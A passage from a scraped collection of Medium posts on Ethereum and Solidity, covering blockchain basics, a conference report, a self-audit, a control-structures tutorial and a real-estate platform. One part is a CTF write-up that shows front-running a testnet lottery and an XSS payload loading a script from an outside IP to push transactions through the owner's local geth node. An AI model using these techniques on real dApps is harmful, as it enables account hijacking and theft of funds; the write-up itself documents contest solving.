\u201cterahashes\u201d or unsuccessful attempts per second.Coincidentally, I have the same success rate on Tinder.Back to the blockWhen someone finally solves the puzzle they get the right to say their block is the real official block. They then broadcast out a notification with the details of the new block so that everyone can dump their own now-superceded block and start on a new one. That block now gets added to the ledger \u2013 the latest block in the block chain. If you\u2019re wondering why they bother, they also get rewarded with shiny Bitcoins for playing their part \u2014 that lucky strike of gold after putting in a load of work is why it\u2019s termed \u201cmining\u201d. Probably. Given there\u2019s a serious cash value to Bitcoin, that\u2019s is an obvious incentive.In any case, everyone who gets that block acknowledges the new block, double-checks the numbers correctly solve the puzzle, and agrees that\u2019s correct and gets on with it.You may have noticed the potential for a conflict here. This is a distributed system, with messages going all around the world. If two people on different sides of the globe solve their mega-sudoku at even roughly the same time, there are two potential blocks that are right. There\u2019s no clear consensus because half the world thinks one block was first, the other half think otherwise.This seems like an issue but it\u2019s not, the system is intended to work through it. This fork in the chain is short-lived. Though there is a split with two (or more) blocks and no clear consensus on which is the official, both groups of people simply go on mining on their preferred chain. One of the divergent factions will get a second block much faster than the other. With one block in one faction, and two in another, everyone immediately sides with the longer chain as the official. In theory they could keep getting them at the same rate but in practice this is impossible. The chain that loses support is dropped and never spoken of again like a Flash timeline.You probably haven\u2019t noticed another potential issue here. If the only requirement to be able to maliciously change the blockchain history is to make a longer chain with whatever you want in it, can\u2019t someone just brute-force that?The simple answer is yes. But each block back you have to replace out is an enormous increase in computational requirement. After all, you have to be calculating hashes faster than the entire rest of the network. The block just confirmed \u2013 newly mined \u2013 is not very reliable. Three blocks back is pretty strong though. And six back is considered unbreakable.Note that it takes 10 minutes per block, so this means a transaction is set in stone after about an hour. This is why some sale transactions, etc, take an hour to settle. Trivial transactions like a cup of coffee might well be considered \u201cnear enough\u201d after a single mining, with the seller taking on the risk that the transaction doesn\u2019t get unmade.It should be noted that if a transaction is mined and then lost it isn\u2019t at all gone. It will just end up in a different block and join the chain next time.All of the above is written specifically about Bitcoin. But it isn\u2019t unique to Bitcoin. These processes and principles apply to all crypto-currencies and form the backbone of the technology. The important things to understand are that a \u201cblock\u201d is a list of transactions, and when confirmed they\u2019re added to a \u201cblockchain\u201d that forms a concrete ledger that firms up over an hour or so.No now let\u2019s ignore Bitcoin because it\u2019s boring. Technology-wise, anyway.Let\u2019s talk EthereumBitcoin was essentially the proof of concept, and a proof that has succeeded beyond the expectation of most. But Ethereum is the logical next step \u2014 Bitcoin 2.0. Or depending who you listen to, Bitcoin is the one true crypto-currency and Ethereum is a Ponzi scam. Tomato potato.The Ethereum crypto-currency itself requires careful conversation. For example, Ethereum is not a crypto-currency. Ethereum is the protocol or network, the currency is called Ether. Ethereum needs to be discussed carefully because it does a lot more than Bitcoin, which means more scope for misunderstandings.While Bitcoins can do little more than be traded as a currency, the Ethereum network is capable of a great deal more. Specifically, the transactions entered into the blockchain don\u2019t necessarily just contain financial information, but can actually consist of executable code.Ethereum applications are built in a language called Solidity. This is a relatively simple and limited language with syntax like JavaScript got busy with Go one fateful night. When deployed to the network these applications are called Smart Contracts. Which honestly probably tells you a decent amount about what they\u2019re intended for.Getting your head around Ethereum applications isn\u2019t difficult from a syntax or technical point of view. It\u2019s more about understanding what you would use it for. It\u2019s much less about how do you add two numbers together or write a loop, and much more about understanding how and why the blockchain provides an option for specific cases.A classic example of this is an \u201cescrow\u201d system, possibly used for something like selling on Ebay. This requires one person to put money in, and then another to get it out only if both parties agree. Ideally this is the buyer and the seller, product was received, all was well. The above is all achieved by the fact that the deployed app is essentially an account itself. Money can be sent directly to it, and then the internal balance of the contract queried, checked, confirmed. Functions of that contract can be executed to give the seller the money or return it to the buyer. (Guards are put around who can execute these functions, which are tied to the relevant accounts.)Smart Contracts form a transparent and cost-effective way to store money and the state of the agreements around that money. Large financial institutions including the Australian Stock Exchange, Barclays and Citibank are investing vast sums of money into pilots of these technologies to replace existing slow and manual reconciliation processes.For the record, Smart Contracts form the main area of my own interest as well. This is a huge market at the moment, with a lot of interest from a range of parties. If like me you\u2019re looking for some side-gigs to supplement your full-time modelling career you can do worse than looking in this space.Distributed Apps - DApps or *shudder* \u00d0AppsDistributed apps are apps that are\u2026 see if you can guess. Honestly this term is poorly defined at this point. What exactly the \u201cdapp\u201d part of an application consists of is not clear. Really only the Solidity contract is actually distributed, so by some definitions that\u2019s the dapp.Structurally, the dapp is just an app. The only thing that really changes is that the persistence layer used for some entities and elements is on the blockchain.There is a fairly consistent misapprehension that the entire application operates on the blockchain, and as a result a common mistake for new developers is to throw lots of state and application logic into the blockchain. There are a lot of reasons this isn\u2019t a good idea. The main one is that it\u2019s expensive, and it\u2019s slow.Think of the smart contract more like a contract. Let\u2019s say you have a system for handling tournaments. In a previous life in the games industry I saw more than a one company promote an esports tournament or competition with a cash prize, only to drag their feet once they had to reach into their pocket.A smart contract could be created that stored prize money, transferring it when a winner was confirmed. This would have a number of advantages\u200a\u2014\u200athe money is \u201cgone\u201d. From the organiser\u2019s point of view there\u2019s no incentive to keep it, and would be no mechanism to get it back. The smart contract could (and should) also have an unbiased third party arbiter, so if the funds weren\u2019t released or finalized, they could simply be forced to after a given date, etc.This smart contract wouldn\u2019t be the whole application. You could have a whole leaderboard, competition application system, admin facilities, etc. But some of those admin tools could connect to the blockchain, the smart contract, and update its state. For example, creating a new tournament would make a new PrizeMoney smart contract. Setting a prize money amount would require that amount to be transferred to the smart contract. The contract\u2019s address would be visible in the tournament page, and interested parties could look and confirm that everything was legit. The leaderboard could also connect to the smart contract. Once a winner is confirmed, the admin update would also trigger the transfer of payment to the winner automatically.This is just a single artificial example of a use for blockchain, and nearly daily I hear clever ideas that are facilitated by the use of this technology.I will write more about blockchain technologies soon, and in more depth than this. There is both a lot of potential and a lot of complexity to these tools, especially from a lowly web developer\u2019s point of view.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Dapps"]}, {"title": "iExec at The Blockchain Summit in London \u2014 October 31st, 2017", "post_link": "https://medium.com/iex-ec/iexec-at-the-blockchain-summit-in-london-october-31st-2017-2f24f7bbf01b?source=search_post", "author_name": "Julien B\u00e9ranger", "author_link": "https://medium.com/@julienbrg", "publish_date": "2017-11-02", "last_modified_date": "2018-05-18", "readtime": "2.05", "claps": 268, "voters": 9, "content": "iExec at The Blockchain Summit in London \u2014 October 31st, 2017Julien B\u00e9rangerFollowNov 2, 2017 \u00b7 3 min readiExec was at Marketforce\u2019s 3rd Biannual Conference in London on the 31st of October represented by Jean-Charles Cabelguen. The goal of the event was to stay up-to-date with blockchain\u2019s most recent trends in finance.The Blockchain Summit, Marketforce\u2019s 3rd Biannual ConferenceAt the opening, Noelle Acheson, Editorial Producer at Coindesk, recalls that last year\u2019s talks about blockchain were limited to presenting the potential of the technology. Today, the debate on blockchain moved to practical solutions and deployment strategies. iExec is well aware of this shift, and the roadmap of the project is attuned to this need.Afterwards, Vinay Gupta, Founder at hexayurt.capital, delivered the first talk with a sound-titled presentation: \u201cLet\u2019s Save the World and Make a Lot of Money\u201d. He underlined the impact of combining legal work and blockchain to power innovation and deep change.David Harris, from the London Stock exchange, echoed the opening of the summit. From his point of view, blockchain is moving fast from experimentation to enterprise-grade projects.Evgeny Xata, CEO of Cybertrust, focused his talk on blockchain being the 6th wave of the economic development, right after microchips. From his projection, the expected value created from blockchain and artificial intelligence could be worth four times the value created by the microchip revolution.During the conference, three main topics were discussed. For each one of them, six speakers shared either novel concepts or case studies.Digital IdentityTransfer and TradingSmart ContractsThe last panel discussion and questions of the summit were managed by Nikola Tchouparov \u2014 CEO & Co-Founder at Moneyfold Ltd, Arnaud Le Hors \u2014 Technical Lead at Hyperledger, Mark Simpson \u2014 Innovation Engineering at Royal Bank of Scotland and Anthony Macey \u2014 ead of Blockchain R&D at Barclays.In short, they all predicted that standardisation will come from projects backed by great vision, but also from regulatory initiatives originating from centralized structures. iExec is also following this path by being at the forefront of the ICO movement in France, all while meeting with regulators and media to develop best practices for crypto funding.The rest of the day was perfect to spend time with crypto fans and large corporate companies involved in international development, industrial projects, standardization, and international marketing. A perfect timing for iExec to network and initiate future partnerships off-conference!", "responses": 1, "tags": ["Blockchain", "London", "Ethereum", "Cloud Computing", "Solidity"]}, {"title": "Self-audit, a new bug, and call for community auditing of BlockParty", "post_link": "https://medium.com/noblocknoparty/self-audit-a-new-bug-and-call-for-community-auditing-of-blockparty-e774a8596496?source=search_post", "author_name": "makoto_inoue", "author_link": "https://medium.com/@makoto_inoue", "publish_date": "2018-07-27", "last_modified_date": "2018-08-23", "readtime": "4.56", "claps": 75, "voters": 9, "content": "Self-audit, a new bug, and call for community auditing of BlockPartymakoto_inoueFollowJul 27, 2018 \u00b7 5 min readBack in June, Josef Jelacic decided to use BlockParty at his UX & Adoption conference in Prague.BlockParty has been my personal pet project over the last two years and I was always the one to deploy and administer the entire process. Josef used BlockParty not only to host his events (pre-conf dinner and spare slots for the unconf event) but he actually deployed the whole smart contract and its frontend all by himself.Hats off to Josef for his bravery but this reminded me of the importance of security. Even though the deposit is small, it still sucks for losing money for bugs.Doing a self-auditSo I decided to audit my own code for a sanity check. You can find the full report of my self-audit here.To begin with, I followed the \u201cHow to prepare for a security audit\u201d guide by Trail of Bits and added all sorts of tools (such as linting and code coverage) to make the environment as clean as possible.It felt good to see apassing green sign and over 98% coverage, though it later came back to bite me :-(The next thing I did was to describe the behavior of the smart contract as much as possible. I not only commented all my smart contract source code but also used tools like surya and solgraph to visualise my code.$ surya describe  contracts/Conference.sol  +  Conference (Destructible, GroupAdmin)    - [Pub] <fallback>     - [Ext] registerWithEncryption ($)    - [Ext] register ($)    - [Int] registerInternal     - [Ext] withdraw     - [Pub] totalBalance     - [Pub] isRegistered     - [Pub] isAttended     - [Pub] isPaid     - [Pub] payout     - [Ext] payback     - [Ext] cancel     - [Ext] clear     - [Ext] setLimitOfParticipants     - [Ext] changeName     - [Ext] attendThe contract function dependency graph generated by solgraphAnother important thing was to write down past vulnerabilities. I wrote down the detail of when, by who and how they were discovered.Next, I copied my contracts and pasted them into various automated smart contract security analysis sites.I\u2019ve tried the following three sites and here were the results.OyenteThe latest solc supported version is 0.4.17 which was quite old hence I could not test at all.Securify.chNo error was reported. This may be because I used the site in the past and fixed the warnings at that time.SmartDeckNo critical errors were reported, but there were lots of useful warnings. The full report is here. I fixed a few warnings but not all of them. For example, this line was marked for \u201cReentrancy\u201d, but I did not think adding an Ethereum address into an array could cause any re-entrancy issues.Discovering a new bug.A new bug was reported by a user of Mythril, a security analysis tool for Ethereum smart contracts which I\u2019d only briefly dabbled with.When I ran Mythril (0.18.6 at that time), there were lots of duplicate errors against unrecognised functions (eg: _function_0x05f203d9) which made it hard to point to the exact location of the vulnerabilities (the full output is here), so I went to the mythril gitter channel and asked for feedback on my log.Mythril reported a transaction order dependence issue, but it was decided that the issue does not pose a risk considering the business logic (and this was confirmed by Mythril engineers).==== Transaction order dependence ====Type: WarningContract: UnknownFunction name: withdraw()PC address: 5265A possible transaction order independence vulnerability exists in function withdraw(). The value or direction of the call statement is determined from a tainted storage location--------------------In file: contracts/Conference.sol:142participant.addr.transfer(payoutAmount)--------------------10 days after I posted my self-audit report to the Mythril gitter channel, I was contacted by a user called nemozqqz regarding a typo in one of the functions.\u201cArray index bug in revoke function of GroupAdmin #175\u201dYes, it was clearly a typo! The bug was introduced back in March when I was enhancing the grant feature to allow deleting multiple admins.Looking back, it was a bad commit because I did not write an additional test to cover the feature.Interestingly, the test coverage tool was showing amber at a line below the vulnerable code (line 36), but not at the typo line itself (line 35).Again, this is completely a logical error so none of the tools I tried were able to detect it. One defensive way to code is to avoid using meaningless variables like i and j (as suggested in the comment by vietlq) but I wonder if there are better idioms to make it more static analyzer (or coverage tool) friendly.The bug was fixed in this PR, but ENS Hackathon is currently using BlockParty with this vulnerability as it was discovered after the contract was deployed. This bug is not critical enough to cancel the entire operation but I need to remember the fact that I will have problem revoking the admin role once I grant it to someone.Call for community auditing of BlockPartyAs you just saw, some of the critical bugs tend to be very simple and you don\u2019t need deep knowledge of Solidity nor the internals of the EVM to figure them out. If more people look into the code base, there is a better chance the bugs will get spotted beyond going through these static analysis tools.There are lots of Ethereum related community events (EthBerlin, Web3 summit, DevCon4) and I am keen to host more pre/post/sub events using BlockParty.If you have a basic understanding of Solidity programming, I would appreciate if you could spend thirty minutes going through the code and let me know if you find anything suspicious.The best way to report any bugs will be to contact me privately via gitter channel (I am @makoto ) or twitter (@makoto_inoue)to assess the impact , then raise a github issue publicly (this is exactly how nemozqqz escalated. Thank you so much!).Special thanks to Bernhard Mueller , Ramesh Nair and Jeff Lau for reviewing this post", "responses": 0, "tags": ["Ethereum", "Security", "Solidity"]}, {"title": "ZeroNights ICO Hacking Contest Writeup", "post_link": "https://blog.positive.com/zeronights-ico-hacking-contest-writeup-63afb996f1e3?source=search_post", "author_name": "Arseny Reutov", "author_link": "https://blog.positive.com/@theRaz0r", "publish_date": "2017-11-15", "last_modified_date": "2018-10-08", "readtime": "4.51", "claps": 19, "voters": 6, "content": "ZeroNights ICO Hacking Contest WriteupArseny ReutovFollowNov 15, 2017 \u00b7 5 min readPrior to ZeroNights security conference, an ICO hacking contest had been announced. The first three contestants to solve the tasks could win invites to the conference. My motivation to participate in the contest was driven by the interest in smart contract security which is gaining popularity in various CTFs nowadays.The ICO website was a dApp that interacted with two contracts on Rinkeby testnet via web3.js. The first contract was an ERC20 token for HACK coins so you could see your balance, number of sold coins, total supply, etc. The ultimate goal of the contest was to get more than 31337 HACK coins.The other contract was a lottery game, here is a relevant fragment from it:   function spinLottery(uint number) public {        if (msg.sender != robotAddress) {            playerNumber[msg.sender] = number;            players.push(msg.sender);            NewLotteryBet(msg.sender);        } else {            require(block.number - lotteryBlock > 5);            lotteryBlock = block.number;for (uint i = 0; i < players.length; i++) {                if (playerNumber[players[i]] == number) {                    desires[players[i]].active = true;                    desires[players[i]].email = \"*Use changeEmail func to set your email.*\";                    Proposal(players[i], desires[players[i]].email);                }            }            delete players; // flushing round            NewLotteryRound(lotteryBlock);        }    }If you are lucky enough to guess the number your address will be added to the \u201cdesires\u201d mapping. There was a whitepaper like in a real ICO which said that one should be manually whitelisted by the token owner to be able to buy tokens or you could try to win the lottery. Let\u2019s try to beat it!Winning the lotteryLooking at the code above you see that there is a robot that posts random numbers once in 5 blocks. These numbers are submitted in clear text, no seed is used. It means that this code is prone to Transaction Ordering Dependence or Frontrunning. In other words, if we are quick enough to look up the number submitted by the robot and issue our own transaction with this number so that both transaction appear in the same block, we can win the lottery provided that our transaction is executed before robot\u2019s one. How can we achieve this? Very easy, we just need to increase gas price so that it is higher than in the robot\u2019s transaction. After several attempts I managed to fit into the same block with the robot.So, I got in the \u201cdesires\u201d mapping, but I still could not buy tokens. To do so, my address has to be moved from \u201cdesires\u201d to the \u201cwhitelist\u201d mapping. From the code it is evident that only contract owner is able to do that:   function addParticipant(address who) onlyController public {        if (isDesirous(who) && who != controller) {            whitelist[who] = true;            delete desires[who];            AddParticipant(who);            RemoveProposal(who);        }    }Getting to the whitelistThe smart contract didn\u2019t contain any flaws that could promote me to the whitelist. However, the web application written in Vue.js had the following code that displayed user\u2019s email address:domProps: {  innerHTML: t._s(e.email)}It means that user controlled input was reflected on the page without sanitization, or simply put \u2014 we had an XSS. Using `changeEmail` method I got some HTML markup injected onto the page.This is where it gets interesting: what if the contract owner visits this page in his browser? If it happens, we can try to send a transaction via local geth node usually listening on localhost:8545 that will add us to the whitelist on behalf of the contract owner provided that his account is unlocked. Looked unlikely, but it was worth a try. Shortly after, I came up with the following JS code:var web3 = new Web3(new Web3.providers.HttpProvider(\"http://localhost:8545\"));var abi = /* CONTRACT ABI HERE */[];web3.eth.defaultAccount = web3.eth.accounts[0];var c = web3.eth.contract(abi).at(\"0xd80cc3550da18313af09fbd35571084913cd5246\");c.addParticipant(\"0x949db1e44B7762683d1Cf947D2B3c2358bD7434A\", function(a,b){console.log(b)});Having uploaded it to my box, I sent changeEmail tx once again with the following code instead of my email address:<img src=x onerror='var a=document.createElement(\"script\");a.src=\"http://52.207.112.238/test.js\";document.body.append(a);'>To my surprise, the contract owner indeed was visiting the site and he had a geth node running on localhost. The code worked well and shortly after I saw myself in the whitelist.Buying tokensAt that point nothing could stop me from buying 31337 tokens. Except the following require() statement in buy() method:require(hack.balanceOf(msg.sender) + hacks <= 1000 ether);It meant that I could not own more than 1000 HACK coins. But what if we just transfer these 1000 tokens to some other our address and then buy again? Let\u2019s look at transfer method:function transfer(address _to, uint256 _value) public afterICO returns (bool) {/* ... */}It has afterICO modifier which should stop us from transferring the funds. However, it was ineffective since the condition was not used in require():modifier afterICO() {    block.timestamp > November15_2017; _;}After making 32 \u201cbuy & transfer\u201d transactions I got the desired balance:It actually needed +1 HACK, otherwise the checker script would fail.Crafting an off-chain transactionThe final task which seemed really easy at first sight was to issue a signed off-chain transaction that contained \u201cHACK\u201d in msg.data. The key word here is a \u201ctransaction\u201d. I spent a couple of hours hopelessly trying to make checker script validate a signed message as in the Ethernaut CTF until I realized that a signed off-chain transaction was needed.There are no easy ways to do it via web3, but luckily a project called ethereumjs-tx seemed to be the right tool.Transactions in Ethereum are signed with sender\u2019s private key, so we have to extract it from MetaMask first. After numerous attempts to build different tx structures which were all rejected by the checker script I finally came up with the following one:var Transaction = require('../index.js')var tx = new Transaction(null, 1)var privateKey = new Buffer('cafebabe', 'hex')var rawTx = {  nonce: '0x00',  gasPrice: '0x09184e72a000',  gasLimit: '0x2710',  to: '0x9993ae26affd099e13124d8b98556e3215214e81',  value: '0x00',  data: '0x4841434b' // HACK}var tx = new Transaction(rawTx)tx.sign(privateKey)var serializedTx = tx.serialize()console.log(serializedTx.toString('hex'))After submitting the result I finally got the flag which granted me second place.We would like to thank the organizers for the great contest. If your ICO needs professional smart contract audit & all-round security assessment do not hesitate to contact Positive.com.Until next time!", "responses": 1, "tags": ["Ethereum", "Solidity", "Security", "Blockchain"]}, {"title": "Control Structures in Ethereum", "post_link": "https://medium.com/@k3no/control-structures-in-ethereum-3f2d4149b84a?source=search_post", "author_name": "Keno Leon", "author_link": "https://medium.com/@k3no", "publish_date": "2017-12-28", "last_modified_date": "2019-07-23", "readtime": "6.82", "claps": 72, "voters": 9, "content": "Control Structures in EthereumKeno LeonFollowDec 28, 2017 \u00b7 7 min readListen, I love Ethereum, I think it\u2019s cool as hell, I even wrote a book about it, what I really don\u2019t like is the documentation ( that\u2019s why I wrote the book \ud83e\udd14 ?) for instance here\u2019s all the documentation on control structures:Most of the control structures from JavaScript are available in Solidity except for switch and goto. So there is: if, else, while, do, for, break, continue, return, ? :, with the usual semantics known from C or JavaScript.I get it, most programmers don\u2019t want to be told what a for loop is for the 200th time in their career, but I side on those that do want to see a minimal example on all these control structures, so here we are, let\u2019s go one by one.if else :The hardest working control statement in the business if serves a conditional and can be used in contracts like so:pragma solidity ^0.4.0;contract Conditional { uint refVal = 10; function isGreaterEqual(uint testVal) view public returns( bool ){     if(testVal >= refVal){        return true;     }   } }// isGreaterEqual(9)... false// isGreaterEqual(10)... true// isGreaterEqual(11)... trueyou are more likely to encounter multiple conditions concatenated like so:pragma solidity ^ 0.4.0;contract Conditional {uint refVal = 10;uint limit = 20;function isGreaterEqualUnderLimit(uint testVal) view public returns(bool) {    if (testVal >= refVal         && testVal < limit) {      return true;    }  }}//isGreaterEqualUnderLimit(9)... false//isGreaterEqualUnderLimit(10)... true//isGreaterEqualUnderLimit(11)... true//isGreaterEqualUnderLimit(20)... falseThe compiler ( I am using remix to test these contracts ) seems to return false umprompted, but smart contracts I think need to be explicit and verbose to avoid any potential bugs or misunderstandings, so using else might be a better pattern:pragma solidity ^ 0.4.0;contract Conditional {uint lower = 10;uint upper = 20;function inBetween(uint testVal) view public returns(bool) {    if (testVal > lower         && testVal < upper) {      return true;    } else {      return false;    }  }}//inBetween(9)... false//inBetween(10)... false//inBetween(11)... true//inBetween(19)... true//inBetween(20)... false//inBetween(21)... falseWhile:While loops are powerful things but could also break your contract, let\u2019s start with a seemingly innocent loop:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 6;function decrementer() public {        while (testVal >= 4 ){            testVal --;        }    }}// Running the example:// testVal : 6// decrementer()... testVal-- runs 3 times...// testVal : 3The main issue with while loops in Solidity is the use of gas, in the above example ( testVal- -) which decrements by one testVal runs 3 times, and each time it runs it consumes and adds a bit of gas to the transaction, you can see how a while loop that goes over 100\u2019s or thousands of fields could run out of gas, so they are discouraged, I would limit it\u2019s use to small iterators.ForFor loops are usually an alternative to while loops and handy for repetitive operations, the ubiquitous : for (i = 0; i < 100 ; i++) { //repeat stuff 100 times } for instance.Here\u2019s an example in solidity:pragma solidity ^ 0.4.0;contract Loops {     uint public testVal = 0;    uint[] testArray;    function iterator() public {    for (uint i=0; i < 4; i++){        testVal++;        testArray.push(i);     }  }function getArray() view public returns(uint[]) {       return testArray; }}After running iterator():// testval: 4// getArray(): [0,1,2,3]Like while loops, these are gas intensive methods; how much ? the above loop costs~ 139,276 wei when i<100 it runs out of the allotted 300,000 wei , just keep it in mind.BreakA break allows you to exit a loop at some point, usually when a condition is met and then execute the next set of instructions in a function\u2026pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function accumulator() public {    while (testVal >= 0) {      testVal++;      if (testVal == 4) {        break;      }    }    testVal = testVal + 6;  }}// After running accumulator()...// testval : 10Notice where the next instruction appears after the break; if you were using a defined variable in a for loop you would place the next statement closer and completely change the outcome, for instance:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function innerAccumulator() public {    for (uint i = 0; i < 5; i++) {      if (i == 4) {        break;      }      testVal = testVal + i;    }  }}// After running innerAccumulator()...// testVal : 6 let's go step by step to understand it:// when.. // i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1 // i: 2... testVal = (1 + 2) = 3// i: 3... testVal = (3 + 3) = 6// i: 4... since i == 4, testVal remains the same ( 6 ) and the addition doesn't get to execute.If you have any doubts or weird readouts, I recommend you run your loops line by line like we just did to figure out the correct behavior.ContinueA close relative of break, continue jumps out of the loop and has a nuanced different behavior depending on the loop:In a while loop, it jumps back to the condition.In a for loop, it jumps to the update expression.Don\u2019t worry, it makes slightly more sense in example form:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function skipValue() public {    uint counter = 0;    while (counter < 6) {        counter++;        if(counter == 4)        continue;        testVal++;    }  } }// After running skipValue()...// testVal : 5let's go step by step :// when.. // counter: 0... testVal = (0 + 1) = 1// counter: 1... testVal = (1 + 1) = 2// counter: 2... testVal = (2 + 1) = 3// counter: 3... testVal = (3 + 1) = 4// counter: 4... Here the if statement kicks in and goes back to the while loop, no addition is made, but the process continues.// counter: 5... testVal = (4 + 1) = 5 Our final value. It is important to note where the counter is placed, if placed under the if conditional you got yourself an infinite loop !Now let\u2019s check it\u2019s use in for loops:pragma solidity ^ 0.4 .0;contract Loops {  uint public testVal = 0;function skipValue() public {    for (uint i = 0; i < 5; i++) {      if (i == 2) {        continue;      }      testVal = testVal + i;    }  }}// after running skipValue()...// testVal: 8// step by step// when.. // i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1// the condition i++ is evaluated and the conditional is true, so the loop starts again... // i: 3... testVal = (1 + 3) = 4// i: 4... testVal = (4 + 4) = 8Without the continue it would run like this:// i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1// i: 2... testVal = (1 + 2) = 3// i: 3... testVal = (3 + 3) = 6// i: 4... testVal = (6 + 4) = 10As seen, both have roughly the same effect of skipping a condition, but knowing how they behave in detail is important to avoid bugs.ReturnA return statement simply stops the function execution and returns a value or not, used as a control structure you could use it like so:pragma solidity ^ 0.4.0;contract ReturnContract {  uint public testVal = 0;function returner() public {    testVal = 1;    return;    testVal = 2; // <- this won't happen  }}// After running returner..// testVal: 1// the second testVal assignment doesn't get to execute.more often than not, you will see it used along with a returned value.pragma solidity ^ 0.4.0;contract ReturnContract {function returner() public pure returns(uint) {    uint testVal = 1;    testVal = testVal + 3;    return testVal;    testVal = 8; // <- This will never execute.  }}// Calling returner(): 4// Not only does return gives you back a value, everything after the return does get to execute.Notice we need to provide both the keyword returns and the type returned uint , you can also specify a name returns(uint testVala)Ternary OperatorNot to be confused with labels : which I belive don\u2019t exists in solidity, you can think of it as a shorthand if else:in the following form: condition ? expr1 : expr2 , it is super useful and greatly in use, here\u2019s a few common uses starting with a common conditional:pragma solidity ^ 0.4.0;contract Ternary {  uint public outputVal = 0;  function testVal(uint inputVal) public {    inputVal < 10 ? outputVal = 1 : outputVal = 2;  }}// in other words, if inputVal is less than 10, outputVal is 1, else it is 2...// testVal(3)... outputVal: 1// testVal(11)... outputVal: 2You can also use it with return:pragma solidity ^ 0.4.0;contract Ternary {  function testVal(uint inputVal) public pure returns(uint) {    return inputVal < 10 ? 1 : 2;  }}//testVal(5): 1//testVal(11): 2And assign variables :pragma solidity ^ 0.4.0;contract Ternary {  function testVal(uint inputVal)public pure returns (uint){    uint innerVal = inputVal < 10 ? 1 : 8;    return innerVal + 2;  }}// testVal(7) : 3   // testVal(12) : 10And that\u2019s it, I could probably go on about conditionals all day, but this will hopefully be enough to give you an overview of how to use them in your contracts and expand on the documentation.Thanks for reading !KenoShameless plug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook and print Book on getting started:https://www.amazon.com/dp/B078CQ8L7VAbout the Author :Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": 0, "tags": ["Ethereum", "Programming", "Solidity", "Smart Contracts", "Cryptocurrency"]}, {"title": "The smart contracts powering blockimmo", "post_link": "https://medium.com/blockimmo/the-smart-contracts-powering-blockimmo-fc16e1bbee09?source=search_post", "author_name": "Michael Dietz", "author_link": "https://medium.com/@waya.ai", "publish_date": "2018-04-13", "last_modified_date": "2018-07-18", "readtime": "6.99", "claps": 23, "voters": 9, "content": "The smart contracts powering blockimmoMichael DietzFollowApr 13, 2018 \u00b7 7 min readblockimmo is a secure, simple platform for buying, selling, and investing in Swiss \ud83c\udde8\ud83c\udded real-estate. By migrating specific components of the Swiss real-estate market on-chain (the Ethereum blockchain), and integrating seamlessly with the existing processes and systems powering this industry, blockimmo aims to facilitate a more accessible, streamlined market.What You Need to Know About The Swiss Real Estate Market 2017/2018The Swiss Real Estate Market is an interesting one.medium.comThe types of listings on blockimmoblockimmo\u2019s primary use-case is the sale of commercial investment properties and the financing of development projects. These properties are usually owned by multiple parties (investors) in differing stakes (shares). A blockchain-based solution introduces the following \ud83d\udd11 benefits:\u2705 Property ownership can occur in small stakesA few hundred dollars is all you need to start investing in real-estate.\u2705 Investments are liquidProperty can be bought and sold on the scale of minutes.\u2705 Fees are reduced by an order of magnitudeFees are one of the most important determinants of investment performance.\u2705 Accessible to the general investorPrime investments no longer happen behind closed doors in small groups of big-shot investors, and sellers have access to a much larger audience.Buying, selling, and investing in real-state becomes secure, simple, and transparent with blockimmo.This is a semi-technical post and assumes the reader has a basic understanding of blockchain and smart contracts. It gives a high-level overview of blockimmo\u2019s core smart contracts and highlights some of the design principles guiding development. Detailed documentation will be released when we open-source our contracts in the coming months. For an introductory post see:Blockchain and the Future of Real EstateUnleashing the power of blockchain into the real estate market.medium.comExecutive overviewAn overview of the smart contracts powering blockimmoThe \ud83d\udd34 LandRegistry is a simple smart contract living on the Ethereum blockchain. The first step of creating a listing on blockimmo is tokenizing a property for sale (if not already on-chain). This is the process of moving a property to its on-chain representation. A \ud83c\udf4a TokenizedProperty smart contract is deployed (completely independent of LandRegistry and other properties that already/will live on-chain) that becomes the official representation of the rights/ownership to this specific property. At this point, blockimmo initiates processes in the background to verify/validate the authenticity of this listing, and append the TokenizedProperty to the LandRegistry if \ud83d\udcaf.A \ud83c\udf15 ShareholderDAO contract is then deployed (completely independent of TokenizedProperty), and granted control of TokenizedProperty. It enables owners of a property to make major decisions related to the property via a de-centralized voting process.Lastly, a \ud83d\udd35 CrowdSale contract is deployed (completely independent of TokenizedProperty and ShareholderDAO), and given access to the tokens to be sold. Multiple investors can now buy tokens of property (through the CrowdSale) with ETH! The seller of the property will receive ETH, and the investors will receive tokens!blockimmo aims to be flexible and enable an eco-system of on and off-chain services. We will go into more detail about our vision and how our technology enables this in a future post. The important thing to note is that these smart contracts are designed to be modular and plugged into by other contracts/parties. In the following sections we will briefly look into each of these contracts in a bit more detail.The land registry \u2014 ground zeroThe on-chain land registry organizes and indexes `TokenizedProperty`s by their Grundst\u00fcck and E-GRID NumberThe Swiss cadastral system (Land Register) is an immutable, append-only, public ledger (sound familiar \ud83e\udd14?) recording the rights/ownership pertaining to plots of land. Each and every parcel of land in Switzerland is recorded here, indexed by it\u2019s Grundst\u00fcck Number (by canton) and E-GRID Number (a universally unique identifier). All information relevant to this land is publicly available and attainable with this number. This information is maintained by Swiss land registrars, and is easily accessible to the general public. There is no need to duplicate this information and store it on-chain.These fundamental characteristics of the Swiss land registry make it a perfect fit for blockchain \u2014 an extremely simple smart contract can encompass this functionality. This contract has a single public state variable landRegistry, mapping grundst\u00fcckNumbers \u27a1\ufe0f TokenizedPropertys. Each TokenizedProperty is an independent smart contract that controls and manages that plot of land.Furthermore, the Swiss land registry is partially decentralized \u2014 there is no central land registrar. Rather, the individual cantons are responsible for maintaining their land register, and the cadastral surveying is mostly done by private parties acting as public agents, providing a decentralized service.As the blockimmo platform matures, we envision completely decentralizing this system \u2014 cadastral surveying will be commissioned and delivered/executed on-chain. This is a next step, and highlights our modular, one-step-at-a-time approach towards moving the Swiss real-estate industry/market on-chain.How the Swiss Land Registry Works: a basic guide.The Land Registry in Switzerland is a system as complex and detailed as an antique Swiss clock.medium.comTokenizing real-estateThe on-chain digital asset controlling and representing 